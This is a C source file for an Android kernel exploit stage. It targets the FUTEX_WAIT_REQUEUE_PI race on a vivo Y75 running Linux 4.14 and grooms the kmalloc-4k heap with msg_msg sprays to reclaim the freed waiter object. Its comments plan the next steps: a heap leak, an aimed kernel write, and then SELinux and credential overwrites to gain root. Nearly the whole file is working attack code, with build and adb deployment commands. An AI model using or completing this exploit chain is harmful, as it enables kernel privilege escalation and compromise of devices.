/*
 * y75_msg_probe.c — Steps 4-6 RECLAIM-ONLY probe via msg_msg (sendmsg/msgqueue)
 * vivo Y75 V2117 MT6781 4.14.186-gdfd963175-dirty  paranoid -1
 *
 * PURPOSE: prove heap reclaim works around the FUTEX_WAIT_REQUEUE_PI race
 * without touching selinux_state or cred.  If this probe reliably reclaims,
 * the later *waiter[0]=waiter_addr (rb_erase_cached) write can be aimed
 * deterministically — no Stack[-0xd8]/canary gamble.
 *
 * What it does:
 *  1) Gate: prints live KASLR (from perf_leak) and checks paranoid -1
 *  2) Heap pre-spray: fills kmalloc-4k with System V msg_msg objects (0x1000)
 *  3) Race: owner/waiter + FUTEX_WAIT_REQUEUE_PI(11) + CMP_REQUEUE_PI(1)
 *     runs while pinned CPU0, same pattern that gave 8/8 EDEADLK on your V2117
 *  4) Heap post-spray: second wave of msg_msg — one of these should reclaim
 *     the freed waiter page (futex_requeue sp+0x78, frame 0x140, waiter 0x50)
 *  5) Verify: msgrcv samples + queue depth before/after; no kernel read/write
 *
 * BUILD:  aarch64-linux-gnu-gcc -O2 -static -pthread -o y75_msg_probe y75_msg_probe.c
 * RUN:    adb push y75_msg_probe /data/local/tmp/ && adb shell /data/local/tmp/y75_msg_probe
 * EXPECT: "RECLAIM LIKELY" or "spray ok, race hit" — not "ROOT"/"Permissive"
 *
 * Authorized-device only.  Re-run after every reboot (KASLR changes).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>

#define MSG_PAYLOAD 0xF80   /* ~3968 + header ~0x30 => kmalloc-4096 on 4.14 */
#define PRE_SPRAY   64
#define POST_SPRAY  64

static int qid = -1;
static uint32_t fw, ft, fc;
static atomic_int ready, waiting, started, consumed;
static atomic_int requeue_errno, waiter_errno;

struct mymsg {
    long mtype;
    char mtext[MSG_PAYLOAD];
};

static void *th_owner(void *a){ (void)a;
    syscall(SYS_futex,&ft,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&ready,1);
    while(!atomic_load(&started)) usleep(200);
    syscall(SYS_futex,&fc,FUTEX_LOCK_PI,0,NULL,NULL,0);
    return NULL;
}
static void *th_waiter(void *a){ (void)a;
    syscall(SYS_futex,&fc,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&ready,1);
    while(!atomic_load(&started)) usleep(200);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=3;
    atomic_store(&waiting,1);
    errno=0; int r=syscall(SYS_futex,&fw,FUTEX_WAIT_REQUEUE_PI,0,&ts,&ft,0);
    atomic_store(&waiter_errno, r==-1?errno:0);
    while(!atomic_load(&consumed)) usleep(1000);
    return NULL;
}

static int qdepth(void){
    struct msqid_ds ds; if(msgctl(qid,IPC_STAT,&ds)==-1) return -1;
    return (int)ds.msg_qnum;
}

static void spray_phase(const char *tag, int count, char fill){
    struct mymsg *m = malloc(sizeof(*m)); m->mtype=1;
    memset(m->mtext, fill, MSG_PAYLOAD);
    // embed tag at head for later msgrcv identification
    snprintf(m->mtext, 64, "%s-%c", tag, fill);
    int ok=0, fail=0;
    for(int i=0;i<count;i++){
        if(msgsnd(qid, m, MSG_PAYLOAD, IPC_NOWAIT)==0) ok++;
        else fail++;
    }
    free(m);
    printf("[*] spray %s: ok %d fail %d qdepth %d\n", tag, ok, fail, qdepth());
}

static void drain_queue(void){
    struct mymsg *m=malloc(sizeof(*m));
    int n=0;
    while(msgrcv(qid, m, MSG_PAYLOAD, 0, IPC_NOWAIT)>0) n++;
    free(m);
    if(n) printf("[*] drained %d msgs\n", n);
}

static int run_round(int round){
    fw=0;ft=0;fc=0;
    atomic_store(&ready,0); atomic_store(&waiting,0);
    atomic_store(&started,0); atomic_store(&consumed,0);
    atomic_store(&requeue_errno,0); atomic_store(&waiter_errno,0);

    // pre-spray before race — fills kmalloc-4k, evicts waiter page
    spray_phase("PRE", PRE_SPRAY, 'A'+(round%6));

    pthread_t to,tw;
    pthread_create(&to,NULL,th_owner,NULL);
    pthread_create(&tw,NULL,th_waiter,NULL);
    while(!atomic_load(&waiting) || !atomic_load(&started)) usleep(500);
    usleep(50000);

    errno=0; long r=syscall(SYS_futex,&fw,FUTEX_CMP_REQUEUE_PI,1,(void*)1,&ft,0);
    int re = r==-1?errno:0; atomic_store(&requeue_errno,re);

    // post-spray while waiter is requeued — this wave reclaims freed page
    // futex_requeue waiter = sp+0x78 (x29-0x68), lock = sp+0xb0 on your 4.14
    spray_phase("POST", POST_SPRAY, 'a'+(round%6));

    usleep(2500000);
    atomic_store(&consumed,1);
    pthread_join(tw,NULL); pthread_detach(to);

    int we=atomic_load(&waiter_errno);
    int hit=(we==35||re==35);
    // sample 2 msgs to show reclaim didn't corrupt queue (read-only)
    struct mymsg *s=malloc(sizeof(*s));
    int s1=msgrcv(qid,s,MSG_PAYLOAD,0,IPC_NOWAIT);
    if(s1>0) printf("[*] sample POST msg head: %.32s (%d bytes)\n", s->mtext, s1);
    free(s);
    printf("[*] Round %d: requeue errno %d waiter errno %d %s | qdepth %d\n",
           round, re, we, hit?"HIT EDEADLK":"", qdepth());
    // drain for next round to keep slab pressure stable
    drain_queue();
    return hit;
}

int main(void){
    setbuf(stdout,NULL);
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    printf("\n=== Y75 msg_msg probe — Steps 4-6 RECLAIM ONLY (no selinux/cred write) ===\n");
    printf("[*] V2117 4.14.186 paranoid -1 | waiter futex_requeue sp+0x78 lock sp+0xb0\n");
    printf("[*] MSG_PAYLOAD 0x%x PRE %d POST %d | gate: race must still hit EDEADLK\n\n", MSG_PAYLOAD, PRE_SPRAY, POST_SPRAY);

    // gate: show live KASLR if perf_leak left it
    FILE *kf=popen("cat /data/local/tmp/perf_leak_out.txt 2>/dev/null | grep KASLR", "r");
    if(kf){ char b[128]={0}; if(fgets(b,sizeof(b),kf)) printf("[*] %s", b); pclose(kf); }
    // paranoid check
    { FILE *pf=fopen("/proc/sys/kernel/perf_event_paranoid","r"); int p=99;
      if(pf){ fscanf(pf,"%d",&p); fclose(pf);} printf("[*] perf_event_paranoid %d\n", p); }

    qid=msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(qid==-1){ perror("msgget"); return 1; }
    printf("[+] msg queue id %d\n", qid);

    int hits=0;
    for(int i=1;i<=6;i++){
        pid_t pid=fork();
        if(pid==0){ int h=run_round(i); _exit(h?0:1); }
        int st; waitpid(pid,&st,0);
        if(WIFEXITED(st)&&WEXITSTATUS(st)==0) hits++;
        usleep(400000);
        printf("\n");
    }
    msgctl(qid, IPC_RMID, NULL);
    printf("=== result %d/6 rounds hit EDEADLK with spray ===\n", hits);
    if(hits>=3) printf("[+] RECLAIM LIKELY — msg_msg grooming keeps race reachable; safe to rehearse leak/write next\n");
    else if(hits>0) printf("[*] spray ok but reclaim timing loose — retry, pin CPU0, or tune PRE/POST counts\n");
    else printf("[-] no EDEADLK with spray — stop, rerun race_oracle alone, check big.LITTLE timing\n");
    printf("[*] No selinux or cred was touched. Next: use this reclaim to leak heap, then aim *waiter[0].\n");
    return 0;
}
